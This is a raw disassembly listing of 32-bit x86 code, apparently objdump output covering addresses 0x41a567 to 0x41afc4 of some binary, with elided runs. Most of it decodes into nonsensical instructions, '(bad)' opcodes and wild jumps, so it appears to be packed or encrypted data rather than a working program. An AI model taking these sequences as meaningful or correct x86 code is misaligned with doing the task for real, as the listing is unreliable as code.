  41a567:	xchg   ebp,eax
  41a568:	cmp    DWORD PTR [esi+ecx*4-0x33],edx
  41a56c:	mov    DWORD PTR [ecx-0x5aff2103],ebx
  41a572:	add    cl,ch
  41a574:	cmp    eax,0x2dc554e4
  41a579:	push   esp
  41a57a:	fidivr DWORD PTR [edx+0x1c]
  41a57d:	out    0x4b,al
  41a57f:	jmp    0x41a533
  41a581:	sub    BYTE PTR [ecx],0x55
  41a584:	push   ds
  41a585:	inc    ebx
  41a586:	mov    ah,BYTE PTR ds:0x0
	...
  41a5b0:	add    BYTE PTR [eax],al
  41a5b2:	inc    edi
  41a5b3:	pop    ebx
  41a5b4:	cmp    ch,al
  41a5b6:	into   
  41a5b7:	pusha  
  41a5b8:	inc    ecx
  41a5b9:	sub    BYTE PTR ds:0xc5bb72b5,al
  41a5bf:	daa    
  41a5c0:	and    al,0xd5
  41a5c2:	les    eax,FWORD PTR [edi]
  41a5c4:	and    al,0x1
  41a5c6:	gs mov ch,0xd
  41a5c9:	sbb    ebx,DWORD PTR gs:[eax+eax*1-0x17]
  41a5ce:	push   esp
  41a5cf:	aaa    
  41a5d0:	and    al,0xf9
  41a5d2:	mov    ds:0xb538511e,eax
  41a5d7:	test   eax,0x97045be8
  41a5dc:	std    
  41a5dd:	add    BYTE PTR [ebx+eiz*1+0x24],ch
  41a5e1:	adc    BYTE PTR [ebx+ebp*1+0x24],ch
  41a5e5:	sbb    BYTE PTR [esi+0x2d],al
  41a5e8:	xchg   esi,ecx
  41a5ea:	pop    esp
  41a5eb:	xchg   eax,ebp
  41a5ed:	lahf   
  41a5ee:	pop    ebp
  41a5ef:	nop
  41a5f0:	sti    
  41a5f1:	sub    ebp,DWORD PTR [edi-0x1c]
  41a5f4:	dec    esp
  41a5f5:	and    al,0xcb
  41a5f7:	pop    ebp
  41a5f8:	jmp    0xc4c246b5
  41a5fd:	dec    esi
  41a5fe:	js     0x41a582
  41a600:	xchg   DWORD PTR [ebx+edi*1+0x47],ebp
  41a604:	mov    ebp,0xc2e595fa
  41a609:	sar    edi,0x6f
  41a60c:	inc    ecx
  41a60e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a60f:	pop    eax
  41a610:	and    al,0x10
  41a612:	pushf  
  41a613:	mov    ah,0x76
  41a615:	push   es
	...
  41a63e:	add    BYTE PTR [eax],al
  41a640:	push   ds
  41a641:	and    esp,DWORD PTR [eax+ebx*1]
  41a644:	cmp    al,0x25
  41a646:	aaa    
  41a647:	mov    cs,WORD PTR [ebx-0x15000268]
  41a64d:	push   ebp
  41a64e:	dec    edi
  41a64f:	push   ecx
  41a650:	fsub   QWORD PTR [eax-0x6e929c18]
  41a656:	sti    
  41a657:	mov    ebx,DWORD PTR [ebx]
  41a659:	cmp    edx,DWORD PTR [eax]
  41a65b:	mov    ebp,DWORD PTR [edi-0x1b]
  41a65e:	inc    esp
  41a65f:	and    al,0x4f
  41a661:	sub    dl,BYTE PTR [eax-0x75]
  41a664:	mov    eax,ds:0xfa5084
  41a669:	xchg   ecx,eax
  41a66a:	xchg   eax,ecx
  41a66c:	dec    esp
  41a66d:	mov    ds:0x473b6c87,al
  41a672:	mov    eax,0x2ac1bdab
  41a677:	imul   DWORD PTR [esi-0x513e351c]
  41a67d:	jo     0x41a67e
  41a67f:	leave  
  41a680:	ds test edx,ecx
  41a683:	cmp    DWORD PTR [edx-0x62],esi
  41a686:	adc    DWORD PTR [edx+0x4a],esi
  41a689:	or     eax,0xb4a244d
  41a68e:	dec    ebp
  41a68f:	and    al,0x46
  41a691:	sti    
  41a692:	push   esp
  41a693:	and    al,0x4e
  41a695:	aaa    
  41a696:	jle    0x41a698
  41a698:	add    WORD PTR [ecx],0x39
  41a69c:	mov    eax,0xc9fffd7d
  41a6a1:	mov    bh,0x19
  41a6a3:	mov    DWORD PTR [eax],eax
	...
  41a6cd:	add    BYTE PTR [eax-0x4600024b],bh
  41a6d3:	pop    esp
  41a6d4:	cld    
  41a6d5:	jbe    0x41a711
  41a6d7:	ins    DWORD PTR es:[edi],dx
  41a6d8:	cld    
  41a6d9:	jmp    0x803e0418
  41a6de:	jns    0x41a661
  41a6e0:	imul   edi,edi,0x30ff6c99
  41a6e6:	xchg   ecx,eax
  41a6e7:	or     al,0x3
  41a6e9:	mov    DWORD PTR [edx+0x2b],ecx
  41a6ec:	mov    al,BYTE PTR [esi+0x17e5e]
  41a6f2:	cmp    eax,0x1a6c8249
  41a6f7:	mov    dh,0x4
  41a6f9:	je     0x41a747
  41a6fb:	pop    es
  41a6fc:	test   BYTE PTR ds:0xfdf347bb,0x59
  41a703:	lods   al,BYTE PTR ds:[esi]
  41a704:	or     al,0x87
  41a706:	add    bl,BYTE PTR [esi+0x1c]
  41a709:	xchg   edx,ebp
  41a70b:	gs adc al,0x89
  41a70e:	cli    
  41a70f:	pop    ebp
  41a710:	and    BYTE PTR [ecx-0x76eb976e],cl
  41a716:	and    BYTE PTR [eax+0x1c],0x5d
  41a71a:	mov    BYTE PTR [edi-0x77],ch
  41a71d:	push   eax
  41a71e:	cmp    bh,bl
  41a720:	or     ebx,DWORD PTR [ecx-0x43]
  41a723:	pop    ebx
  41a724:	stos   DWORD PTR es:[edi],eax
  41a725:	adc    al,0xfc
  41a727:	imul   esp,edi,0xffffff80
  41a72a:	sbb    dl,BYTE PTR [edx+ebp*2+0x78]
  41a72e:	pop    edx
  41a72f:	pop    ds
  41a730:	out    0x4d,eax
	...
  41a75a:	add    BYTE PTR [eax],al
  41a75c:	(bad)  
  41a75d:	mov    esp,?
  41a75f:	or     ch,BYTE PTR [edi]
  41a761:	fwait
  41a762:	sbb    eax,0xa9540281
  41a767:	sbb    al,0x3e
  41a769:	loop   0x41a78e
  41a76b:	and    BYTE PTR [esi-0x20],bh
  41a76e:	daa    
  41a76f:	outs   dx,DWORD PTR ds:[esi]
  41a770:	inc    esp
  41a771:	fisubr DWORD PTR [edi]
  41a773:	cmc    
  41a774:	push   0xfc3c2bda
  41a779:	jae    0x41a762
  41a77b:	mov    BYTE PTR [edx],cl
  41a77d:	aas    
  41a77e:	stos   DWORD PTR es:[edi],eax
  41a77f:	jle    0x41a7fa
  41a781:	cmovge ecx,DWORD PTR [ecx+0x7ea33f12]
  41a788:	mov    WORD PTR [edi],cs
  41a78a:	inc    ebp
  41a78b:	mov    eax,eax
  41a78d:	outs   dx,DWORD PTR ds:[esi]
  41a78e:	jmp    0x41a793
  41a790:	and    esi,DWORD PTR ds:[eax+0x7e]
  41a794:	pop    esi
  41a795:	pop    edi
  41a796:	out    0x3,eax
  41a798:	mov    ecx,0x79fff7e5
  41a79d:	xchg   esi,eax
  41a79e:	aas    
  41a79f:	out    0x77,al
  41a7a1:	test   DWORD PTR [edx+0x31],edx
  41a7a4:	sub    DWORD PTR [esi],0x5ba9ade6
  41a7aa:	mov    bh,0x42
  41a7ac:	lods   al,BYTE PTR ds:[esi]
  41a7ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7af:	xor    BYTE PTR [ebx+0x66],bh
  41a7b2:	xchg   ebp,eax
  41a7b3:	mov    edx,0x4284649
  41a7b8:	jno    0x41a755
  41a7ba:	sbb    bh,BYTE PTR [ebp+0x180cd4b]
	...
  41a7e8:	add    BYTE PTR [eax],al
  41a7ea:	outs   dx,BYTE PTR ds:[esi]
  41a7eb:	sbb    al,0xe7
  41a7ed:	sar    dh,cl
  41a7ef:	dec    ecx
  41a7f0:	add    BYTE PTR [esi-0x154832c6],ch
  41a7f6:	dec    ebp
  41a7f7:	push   esi
  41a7f8:	add    BYTE PTR [eax-0x1a402403],bh
  41a7fe:	dec    esi
  41a7ff:	mov    al,ds:0x963d907f
  41a804:	std    
  41a805:	jmp    0xa9c54679
  41a80a:	cmp    bl,dl
  41a80c:	mov    ecx,0x515b3df0
  41a811:	pusha  
  41a812:	xor    esp,edx
  41a814:	dec    esi
  41a815:	in     eax,0xbc
  41a817:	cwde   
  41a818:	sbb    BYTE PTR [ecx-0x16416a30],cl
  41a81e:	cmp    al,0x5b
  41a820:	add    BYTE PTR [ebp+eiz*2-0x6a],ah
  41a824:	push   esp
  41a825:	pusha  
  41a826:	dec    esp
  41a827:	dec    esp
  41a828:	shr    ah,0x3d
  41a82b:	pop    ebx
  41a82c:	add    cl,ch
  41a82e:	mov    dh,0x3d
  41a830:	lds    ebp,FWORD PTR [ebp-0x16026a60]
  41a836:	cmp    eax,0x9129815b
  41a83b:	push   eax
  41a83c:	add    ch,ah
  41a83e:	cmp    eax,0xbc05725b
  41a843:	cwde   
  41a844:	add    ch,ah
  41a846:	cmp    eax,0x7128815b
  41a84b:	inc    edx
  41a84c:	stc    
  41a84d:	je     0x41a84f
	...
  41a877:	add    BYTE PTR [ebx-0x1d],bh
  41a87a:	mov    ds,ebp
  41a87c:	popa   
  41a87d:	xchg   ebp,eax
  41a87e:	std    
  41a87f:	bound  ecx,QWORD PTR [ebx-0x24]
  41a882:	enter  0xd3e6,0xdc
  41a886:	and    al,0xe5
  41a888:	cmp    eax,0x4267875b
  41a88d:	pop    ecx
  41a88e:	add    cl,ch
  41a890:	mov    edx,0x230004f5
  41a895:	pop    ecx
  41a896:	add    BYTE PTR [ecx+0x45ba9],cl
  41a89c:	pop    ss
  41a89d:	sbb    BYTE PTR [edx],bh
  41a89f:	mov    edi,DWORD PTR [ecx+0x73]
  41a8a2:	add    al,0x0
  41a8a4:	daa    
  41a8a5:	push   ss
  41a8a6:	xchg   esi,eax
  41a8a7:	adc    BYTE PTR [ebx],ah
  41a8a9:	pop    ecx
  41a8aa:	add    BYTE PTR [ecx+0x47769],cl
  41a8b0:	out    0x16,eax
  41a8b2:	add    eax,0x1c432389
  41a8b7:	mov    esp,DWORD PTR [ebx]
  41a8b9:	inc    ebx
  41a8ba:	push   esp
  41a8bb:	mov    ch,bl
  41a8bd:	pop    edi
  41a8be:	sahf   
  41a8bf:	adc    al,0xe3
  41a8c1:	pop    eax
  41a8c2:	add    BYTE PTR [ecx],al
  41a8c4:	mov    ecx,0xd700046f
  41a8c9:	push   eax
  41a8ca:	test   DWORD PTR [ebx+esi*1+0x6f],edi
  41a8ce:	test   DWORD PTR [ebx+eax*2+0x67],edi
  41a8d2:	test   DWORD PTR [esi+0x5c9b],ebx
  41a8d8:	sub    esp,DWORD PTR cs:[eax+ebx*2]
	...
  41a904:	add    BYTE PTR [eax],al
  41a906:	lods   al,BYTE PTR ds:[esi]
  41a907:	popf   
  41a908:	or     eax,DWORD PTR [esi+0x6054]
  41a90e:	or     ah,ah
  41a910:	add    BYTE PTR [eax],al
  41a912:	xchg   edi,eax
  41a913:	pop    eax
  41a914:	xchg   DWORD PTR [ebx+esi*2+0x24],eax
  41a918:	add    eax,0x4c8746d3
  41a91e:	and    DWORD PTR [eax+0x3d],0xffffff89
  41a922:	fwait
  41a923:	cmp    al,0x18
  41a925:	test   BYTE PTR [esi],bl
  41a927:	adc    ch,BYTE PTR [ecx]
  41a929:	mov    esi,DWORD PTR [ebx-0x36749fc4]
  41a92f:	addr16 add al,0x0
  41a932:	push   edi
  41a933:	jne    0x41a981
  41a935:	and    al,0x3e
  41a937:	push   edx
  41a938:	push   esi
  41a939:	mov    eax,edx
  41a93b:	lea    eax,ds:0x58693e00
  41a941:	and    al,0x8e
  41a943:	jae    0x41a9c2
  41a945:	dec    esp
  41a946:	pop    edx
  41a947:	outs   dx,BYTE PTR ds:[esi]
  41a948:	push   esi
  41a949:	dec    edi
  41a94a:	sbb    edx,esi
  41a94c:	xchg   ah,al
  41a94e:	cs pop es
  41a950:	ror    DWORD PTR ds:0x96ec2,0x3e
  41a957:	test   eax,0x6f5a244d
  41a95c:	push   ss
  41a95d:	mov    DWORD PTR [edx-0x5a],esp
  41a960:	inc    ebp
  41a961:	mov    DWORD PTR [edx+0x5287419e],edx
  41a967:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a968:	sbb    eax,0x87
	...
  41a991:	add    BYTE PTR [eax],al
  41a993:	add    BYTE PTR [edx-0x62],dh
  41a996:	sbb    ecx,ebp
  41a998:	xor    DWORD PTR [ecx],ecx
  41a99a:	inc    ebp
  41a99b:	and    al,0x72
  41a99d:	or     DWORD PTR [edi+0x14],edi
  41a9a0:	cmp    al,BYTE PTR [edx-0x2e82d6ff]
  41a9a6:	push   esi
  41a9a7:	dec    edi
  41a9a8:	ret    
  41a9a9:	cmc    
  41a9aa:	and    eax,0xbf090c34
  41a9af:	call   0xfe33f271
  41a9b4:	(bad)
  41a9b7:	sub    al,0xbd
  41a9b9:	add    ecx,DWORD PTR ds:0x81bba
  41a9c0:	ds stc 
  41a9c2:	xchg   BYTE PTR [edx+eax*2],ah
  41a9c5:	add    BYTE PTR [ecx],0xc5
  41a9c8:	cli    
  41a9c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9ca:	adc    eax,0x1823e00
  41a9cf:	aaa    
  41a9d0:	cli    
  41a9d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9d2:	sbb    DWORD PTR [ebx-0x24],esi
  41a9d5:	add    dl,dh
  41a9d7:	inc    DWORD PTR [eax+0x5b]
  41a9da:	ins    DWORD PTR es:[edi],dx
  41a9db:	push   esi
  41a9dc:	aas    
  41a9dd:	pop    ebx
  41a9de:	out    0x2a,eax
  41a9e0:	cli    
  41a9e1:	ds vmlaunch 
  41a9e5:	and    ebp,edx
  41a9e7:	add    edi,DWORD PTR [esi]
  41a9e9:	out    0x2b,al
  41a9eb:	sub    BYTE PTR [esi+0x2a],cl
  41a9ee:	adc    dl,cl
  41a9f0:	(bad)  
  41a9f1:	sub    esp,DWORD PTR [edx-0x3e]
  41a9f4:	es jle 0x41a9aa
  41a9f7:	icebp  
	...
  41aa20:	add    BYTE PTR [eax],al
  41aa22:	adc    esp,edi
  41aa24:	xor    ebp,DWORD PTR [eax]
  41aa26:	inc    esi
  41aa27:	sub    bh,BYTE PTR [eax]
  41aa29:	jge    0x41aa1b
  41aa2b:	out    0xaf,al
  41aa2d:	fdiv   QWORD PTR [edx+0x37f18e8a]
  41aa33:	sahf   
  41aa34:	idiv   BYTE PTR [esi+0x45]
  41aa37:	pop    esi
  41aa38:	out    0x3,eax
  41aa3a:	mov    bh,0x17
  41aa3c:	retf   
  41aa3d:	sub    edx,DWORD PTR ds:0x3e03e45b
  41aa43:	(bad)  
  41aa45:	test   bl,cl
  41aa47:	pop    ebp
  41aa48:	out    dx,al
  41aa49:	xchg   DWORD PTR [ecx],edi
  41aa4b:	pop    esi
  41aa4c:	out    0x3,eax
  41aa4e:	jne    0x41aaab
  41aa50:	int3   
  41aa51:	add    edi,DWORD PTR [esi]
  41aa53:	(bad)  
  41aa55:	test   BYTE PTR [ebx-0x567811a2],ch
  41aa5b:	pop    ebp
  41aa5c:	out    0x3,eax
  41aa5e:	(bad)  
  41aa5f:	das    
  41aa60:	add    ecx,DWORD PTR [edi+eax*8+0x17]
  41aa64:	retf   
  41aa65:	push   edi
  41aa66:	mov    bh,0xe9
  41aa68:	repz pop es
  41aa6a:	ds pop ebx
  41aa6c:	ret    0xc1c4
  41aa6f:	pop    ss
  41aa70:	ret    
  41aa71:	and    eax,DWORD PTR [esi]
  41aa73:	sub    esi,DWORD PTR [ebp+edi*1+0x69]
  41aa77:	sub    ebp,DWORD PTR [ecx+0x17b555]
  41aa7d:	int    0x19
  41aa7f:	sub    ecx,DWORD PTR [ecx-0x5508de1]
  41aa85:	out    0x0,al
	...
  41aaaf:	add    BYTE PTR [esi-0x1c],cl
  41aab2:	dec    esp
  41aab3:	add    eax,0xd4c4a22
  41aab8:	and    dh,0x41
  41aabb:	call   0xe565c274
  41aac0:	nop
  41aac1:	getsec 
  41aac3:	jb     0x41aad1
  41aac5:	sub    eax,0x16f5a789
  41aaca:	cmc    
  41aacb:	scas   al,BYTE PTR es:[edi]
  41aacc:	push   cs
  41aacd:	in     al,0x4c
  41aacf:	int    0x7d
  41aad1:	fiadd  DWORD PTR [ebp+eax*8+0x59]
  41aad5:	in     al,0x44
  41aad7:	int    0x81
  41aad9:	sub    ecx,DWORD PTR [edi+0x62]
  41aadc:	inc    DWORD PTR [edx-0x701181d3]
  41aae2:	mov    DWORD PTR ds:0xa1293716,ebp
  41aae8:	inc    edx
  41aae9:	call   0x5e38:0x7bbfb0b8
  41aaf0:	in     al,0xa1
  41aaf2:	cli    
  41aaf3:	jb     0x41aaf0
  41aaf5:	shr    eax,1
  41aaf7:	test   BYTE PTR [edx-0x63],0xe9
  41aafb:	sbb    DWORD PTR [ebx],esi
  41aafd:	pop    ds
  41aafe:	and    al,0x15
  41ab00:	or     eax,0xa451cee4
  41ab05:	xchg   ch,bh
  41ab07:	sbb    ah,BYTE PTR ss:[edi]
  41ab0a:	and    al,0xa5
  41ab0c:	adc    dh,BYTE PTR [ebx+0x1b61ad89]
  41ab12:	push   edx
  41ab13:	mov    ecx,0x0
	...
  41ab3c:	add    BYTE PTR [eax],al
  41ab3e:	add    ah,BYTE PTR [ecx-0x7088e018]
  41ab44:	std    
  41ab45:	ret    0xe385
  41ab48:	rol    DWORD PTR [eax],0xec
  41ab4b:	and    DWORD PTR [eax+ebx*2],esp
  41ab4e:	(bad)  
  41ab50:	loop   0x41ab55
  41ab52:	fs xchg edi,eax
  41ab54:	mov    ebp,0x445665f8
  41ab59:	and    al,0x1b
  41ab5b:	inc    esi
  41ab5c:	call   0x44d9fade
  41ab61:	and    al,0x3b
  41ab63:	pop    eax
  41ab64:	add    BYTE PTR [eax],al
  41ab66:	daa    
  41ab67:	in     al,0xfb
  41ab69:	jbe    0x41abaa
  41ab6b:	ds ins BYTE PTR es:[edi],dx
  41ab6d:	and    al,0x5b
  41ab6f:	or     esi,DWORD PTR [eax]
  41ab71:	mov    esp,DWORD PTR [ebx+0x43]
  41ab74:	sub    BYTE PTR [ebp+0x36],dl
  41ab77:	adc    al,0xce
  41ab79:	call   0x3d351f
  41ab7e:	mov    WORD PTR [ebx],?
  41ab80:	and    al,0x44
  41ab82:	pop    esp
  41ab83:	lahf   
  41ab84:	xchg   DWORD PTR [ebx+edi*8+0x1c],eax
  41ab88:	push   edx
  41ab89:	push   eax
  41ab8a:	ins    BYTE PTR es:[edi],dx
  41ab8b:	shr    eax,1
  41ab8d:	stos   DWORD PTR es:[edi],eax
  41ab8e:	imul   eax,DWORD PTR [eax+0x14a43bfb],0xa2f245c
  41ab98:	or     bh,al
  41ab9a:	fwait
  41ab9b:	cmp    BYTE PTR [ecx+eax*1],dl
  41ab9e:	xlat   BYTE PTR ds:[ebx]
  41ab9f:	pop    esp
  41aba0:	add    BYTE PTR [ebp+0x0],al
	...
  41abca:	add    BYTE PTR [eax],al
  41abcc:	adc    BYTE PTR [edx],dl
  41abce:	dec    ecx
  41abcf:	cmp    ebx,esi
  41abd1:	cmp    BYTE PTR [ebp+edi*2-0x28],al
  41abd5:	adc    eax,0x5c9b148e
  41abda:	add    BYTE PTR [edx-0x5a],ch
  41abdd:	sub    eax,0xaf318b4d
  41abe2:	fwait
  41abe3:	repz pusha 
  41abe5:	add    BYTE PTR [edi-0x78e784ac],0xd8
  41abec:	ds std 
  41abee:	inc    edi
  41abef:	and    al,0xfe
  41abf1:	rcl    DWORD PTR [ecx-0x77],cl
  41abf4:	js     0x41ac60
  41abf6:	pop    edi
  41abf7:	mul    BYTE PTR [ecx-0x6f]
  41abfa:	jp     0x41ac48
  41abfc:	and    bl,BYTE PTR [edx+0x70c54f58]
  41ac02:	jg     0x41ac60
  41ac04:	es sbb ecx,0x5c
  41ac08:	dec    eax
  41ac09:	mov    cl,0xee
  41ac0b:	cmp    DWORD PTR [esi],edx
  41ac0d:	std    
  41ac0e:	dec    esp
  41ac0f:	and    al,0x96
  41ac11:	and    dl,bh
  41ac13:	les    eax,FWORD PTR [edx+0x3e00185e]
  41ac19:	add    BYTE PTR [ecx],0xe9
  41ac1c:	inc    ebp
  41ac1d:	add    eax,0x822a246d
  41ac22:	inc    BYTE PTR [edx+0x184f8]
  41ac28:	mov    ebp,0xc80cffee
  41ac2d:	sbb    al,0x4
	...
  41ac57:	add    BYTE PTR [eax],al
  41ac59:	add    BYTE PTR [esi],bh
  41ac5b:	std    
  41ac5c:	push   esp
  41ac5d:	and    al,0x1e
  41ac5f:	or     eax,0x823a1483
  41ac64:	add    DWORD PTR [ecx-0x7eb0f804],eax
  41ac6a:	std    
  41ac6b:	adc    DWORD PTR [edx-0x7f],0xfffffffe
  41ac6f:	adc    DWORD PTR [ecx-0x75],0x72
  41ac73:	push   esi
  41ac74:	xor    BYTE PTR [edi-0x3b],cl
  41ac77:	aaa    
  41ac78:	fst    DWORD PTR [eax-0x7611df49]
  41ac7e:	add    bl,BYTE PTR [esi+0x34]
  41ac81:	cmp    edx,edi
  41ac83:	push   ebp
  41ac84:	sbb    al,0x89
  41ac86:	repnz pop ebp
  41ac88:	cmp    BYTE PTR [edx-0x3b],dl
  41ac8b:	outs   dx,DWORD PTR ds:[esi]
  41ac8c:	push   ecx
  41ac8d:	jl     0x41acec
  41ac8f:	pop    ebx
  41ac90:	(bad)  
  41ac92:	lea    ecx,[edi-0x1c6985e2]
  41ac98:	stos   DWORD PTR es:[edi],eax
  41ac99:	daa    
  41ac9a:	es es mov bh,0x7a
  41ac9e:	js     0x41ac22
  41aca0:	adc    eax,0xd28f63f8
  41aca5:	ret    0xdbb1
  41aca8:	or     DWORD PTR [edx],eax
  41acaa:	aas    
  41acab:	popf   
  41acac:	bound  edi,QWORD PTR [ebx-0x27166e77]
  41acb2:	adc    al,0x83
  41acb4:	shl    edi,0x3b
  41acb7:	(bad)  
  41acb8:	(bad)  
  41acb9:	int3   
  41acba:	(bad)  
  41acbb:	pop    ss
  41acbc:	add    ebx,DWORD PTR [eax+eax*1]
	...
  41ace7:	add    BYTE PTR [ebp+0x16be722b],cl
  41aced:	mov    ds:0xe31bedb4,eax
  41acf2:	lahf   
  41acf3:	sbb    DWORD PTR [edi],eax
  41acf5:	pop    ebx
  41acf6:	mov    al,ds:0x72ba21ac
  41acfb:	push   ds
  41acfc:	or     eax,DWORD PTR [ebp-0x5e381548]
  41ad02:	test   al,0xdb
  41ad04:	push   ebx
  41ad05:	pop    edx
  41ad06:	mov    eax,ds:0xbb378279
  41ad0b:	add    dh,dh
  41ad0d:	push   edx
  41ad0e:	nop
  41ad0f:	outs   dx,DWORD PTR ds:[esi]
  41ad10:	inc    esi
  41ad11:	xchg   esi,eax
  41ad12:	sub    ebp,DWORD PTR [eax]
  41ad14:	sub    bl,BYTE PTR [edi+eiz*8+0x3]
  41ad18:	fsub   DWORD PTR ds:[esi+0x76]
  41ad1c:	push   ss
  41ad1d:	push   edx
  41ad1e:	and    al,0x70
  41ad20:	(bad)  
  41ad22:	mov    ebx,0xb92b6e27
  41ad27:	js     0x41ada1
  41ad29:	xor    DWORD PTR [ebp-0x9],0xffffffa3
  41ad2d:	mov    ?,WORD PTR [edx-0x34]
  41ad30:	(bad)  
  41ad31:	pop    ss
  41ad32:	add    BYTE PTR ds:0x62502a32,cl
  41ad38:	enter  0x7d83,0x1c
  41ad3c:	xchg   ebx,eax
  41ad3d:	nop
  41ad3e:	cmp    DWORD PTR [ecx+0x7b],eax
  41ad41:	loop   0x41ad45
  41ad43:	jmp    0x6721:0x8d815b3d
  41ad4a:	add    dh,dh
	...
  41ad74:	add    BYTE PTR [eax],al
  41ad76:	mov    eax,0x3de90288
  41ad7b:	fdiv   st(3),st
  41ad7d:	jmp    0x5b3d:0xe9d4e052
  41ad84:	mov    DWORD PTR ds:0x35893b16,esi
  41ad8a:	xor    cx,WORD PTR [ecx+0x57496f]
  41ad91:	jmp    0x193d7b54
  41ad96:	mov    edi,0xbf1b0198
  41ad9b:	call   0xed24:0x1f911901
  41ada2:	ins    BYTE PTR es:[edi],dx
  41ada3:	in     al,0xce
  41ada5:	xchg   ecx,eax
  41ada6:	aam    0x92
  41ada8:	std    
  41ada9:	sahf   
  41adaa:	jbe    0x41adc3
  41adac:	and    al,0xd9
  41adae:	jbe    0x41add7
  41adb0:	and    al,0xd5
  41adb2:	data16 das 
  41adb4:	and    al,0xd1
  41adb6:	push   ss
  41adb7:	pushf  
  41adb8:	push   edx
  41adb9:	jb     0x41ad56
  41adbb:	sub    bh,BYTE PTR [esp+ecx*8-0xb]
  41adbf:	rep outs dx,BYTE PTR ss:[esi]
  41adc2:	fisubr DWORD PTR [ecx]
  41adc4:	push   ecx
  41adc5:	jb     0x41ad4a
  41adc7:	aad    0x44
  41adc9:	add    eax,0x5c15835e
  41adce:	mov    ds:0x619d898f,al
  41add3:	aaa    
  41add4:	sub    DWORD PTR [eax],eax
  41add6:	push   esi
  41add7:	loope  0x41ae58
  41add9:	loop   0x41addb
	...
  41ae03:	add    BYTE PTR [edx+ebx*2-0x66a0743e],ah
  41ae0a:	cmc    
  41ae0b:	add    bh,ah
  41ae0d:	ins    DWORD PTR es:[edi],dx
  41ae0e:	call   0xfbc0d212
  41ae13:	push   ebp
  41ae14:	mov    ah,0x12
  41ae16:	into   
  41ae17:	mov    DWORD PTR [ebx+0x45e82c35],esp
  41ae1d:	xchg   bl,bh
  41ae1f:	(bad)  
  41ae20:	in     al,dx
  41ae21:	rol    DWORD PTR [edi+0x27358344],1
  41ae27:	enter  0xd064,0xb8
  41ae2b:	jmp    0xf76fc125
  41ae30:	outs   dx,BYTE PTR ds:[esi]
  41ae31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae32:	cli    
  41ae33:	mov    ebp,ebp
  41ae35:	xchg   esi,eax
  41ae36:	in     eax,0x1f
  41ae38:	and    al,0xcf
  41ae3a:	xchg   DWORD PTR [ebx+eax*2+0x4b],eax
  41ae3e:	inc    edi
  41ae40:	cmp    al,0xae
  41ae42:	jns    0x41ae4c
  41ae44:	loopne 0x41ae61
  41ae46:	and    al,0x14
  41ae48:	es pop ecx
  41ae4a:	add    BYTE PTR [eax],al
  41ae4c:	mov    ds:0x1c287680,al
  41ae51:	pushf  
  41ae52:	jl     0x41ae78
  41ae54:	ins    BYTE PTR es:[edi],dx
  41ae55:	sub    esp,DWORD PTR [eax+esi*1]
  41ae58:	aaa    
  41ae59:	and    eax,0xc6bfce87
  41ae5e:	hlt    
  41ae5f:	(bad)  
  41ae60:	mov    eax,0x238bd80c
  41ae65:	cmp    ebp,DWORD PTR [eax]
  41ae67:	push   ebp
	...
  41ae90:	add    BYTE PTR [eax],al
  41ae92:	aaa    
  41ae93:	or     al,0xce
  41ae95:	call   0x3d3a0f
  41ae9a:	sbb    al,0x9f
  41ae9c:	or     ecx,DWORD PTR [edx+eax*2+0x3e000055]
  41aea3:	add    DWORD PTR [eax+0x24],ebp
  41aea6:	push   edx
  41aea7:	cmp    dl,0x82
  41aeaa:	inc    esp
  41aeab:	add    BYTE PTR [ecx],0x0
  41aeae:	(bad)
  41aeb1:	pop    eax
  41aeb2:	mov    ebx,0x1583f945
  41aeb7:	add    DWORD PTR [ecx],0x0
  41aeba:	mov    ebp,0xc00d0335
  41aebf:	rol    BYTE PTR [eax+eax*1],cl
  41aec2:	ds stc 
  41aec4:	dec    edi
  41aec5:	and    al,0x12
  41aec7:	stc    
  41aec8:	mov    eax,0x77529
  41aecd:	or     dl,BYTE PTR ds:0xc5027235
  41aed3:	cmp    eax,0x96028954
  41aed8:	or     eax,0x54516129
  41aedd:	mov    ecx,DWORD PTR [edx-0x3ab0d7aa]
  41aee3:	mov    bl,0x7c
  41aee5:	pop    esp
  41aee6:	bound  edx,QWORD PTR [esi-0x24]
  41aee9:	int3   
  41aeea:	sub    DWORD PTR [ebp+0x569a37ea],edx
  41aef0:	xor    BYTE PTR [edx+0x4a],dh
  41aef3:	stc    
  41aef4:	dec    esp
  41aef5:	and    al,0x0
	...
  41af1f:	add    BYTE PTR [esi+0x65],cl
  41af22:	push   esi
  41af23:	mov    eax,esi
  41af25:	jmp    0xed3ba352
  41af2a:	jle    0x41af04
  41af2c:	lds    edi,FWORD PTR ds:0x52913820
  41af32:	jge    0x41af02
  41af34:	(bad)  
  41af35:	mov    ds:0x98d9fded,eax
  41af3a:	(bad)  
  41af3b:	mov    DWORD PTR [edx-0x62],esi
  41af3e:	or     eax,0x34f92e7e
  41af43:	and    al,0xe
  41af45:	pop    ebx
  41af46:	jb     0x41af97
  41af48:	bound  eax,QWORD PTR [edi+0x70]
  41af4b:	aaa    
  41af4c:	pop    edx
  41af4d:	push   ebx
  41af4e:	pusha  
  41af4f:	dec    edi
  41af50:	bound  ecx,QWORD PTR [edi+0x62]
  41af53:	aas    
  41af54:	pop    edx
  41af55:	imul   ebx,DWORD PTR [esi+0x2ddfee56],0xffffffdb
  41af5c:	pop    ebx
  41af5d:	mov    dh,BYTE PTR [esi]
  41af5f:	jmp    0x29eb:0x2c031eb7
  41af66:	jb     0x41af21
  41af68:	(bad)  
  41af69:	mov    dl,0xf
  41af6b:	in     al,dx
  41af6c:	outs   dx,DWORD PTR ds:[esi]
  41af6d:	mov    edx,DWORD PTR [esi]
  41af6f:	cs jg  0x41afcd
  41af72:	pop    esp
  41af73:	mov    ds:0x7ee75b3e,al
  41af78:	cli    
  41af79:	ss iret 
  41af7b:	cs mov al,0x36
  41af7e:	jmp    0x41af83
  41af80:	ds push es
  41af82:	(bad)  
  41af83:	jle    0x41af85
	...
  41afad:	add    dl,ch
  41afaf:	ss sti 
  41afb1:	jl     0x41af35
  41afb3:	aas    
  41afb4:	not    DWORD PTR [eax-0x74]
  41afb7:	sub    esp,DWORD PTR [edx-0x46]
  41afba:	push   ss
  41afbb:	mov    ss,edi
  41afbd:	jmp    0x7d5be0e5
  41afc2:	or     ch,dl
  41afc4:	and    esp,DWORD PTR [eax]
